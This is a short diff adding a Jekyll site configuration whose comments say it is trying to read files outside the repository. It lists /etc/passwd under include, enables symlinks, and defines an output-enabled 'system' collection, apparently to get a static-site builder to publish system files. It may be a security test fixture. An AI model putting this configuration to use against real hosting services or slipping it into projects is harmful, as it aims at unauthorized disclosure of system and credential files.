@@ -1,0 +1,20 @@
+plugins:
+  - jekyll-redirect-from
+  - jekyll-seo-tag
+  
+include:
+  - _config.yml
+  - .htaccess
+  - /etc/passwd
+  
+symlinks: true
+
+# Try to read files outside the repo
+baseurl: ""
+url: ""
+
+# Try to include system files
+collections:
+  system:
+    output: true
+    permalink: /:collection/:name
